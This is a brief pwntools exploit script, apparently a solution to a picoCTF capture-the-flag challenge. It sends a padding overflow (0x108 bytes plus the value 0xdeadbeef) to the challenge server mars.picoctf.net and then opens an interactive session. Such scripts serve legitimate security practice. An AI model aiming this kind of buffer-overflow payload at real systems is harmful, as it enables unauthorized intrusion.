#!/usr/bin/env python
from pwn import *
context.arch = "amd64"
epath = "./chall"
e = ELF(epath)
#r = process(epath)
r = remote("mars.picoctf.net", 31890)

pad = b"A"*0x108

#pause()
r.sendline(flat(pad,
                0xdeadbeef))

r.interactive()
r.close()
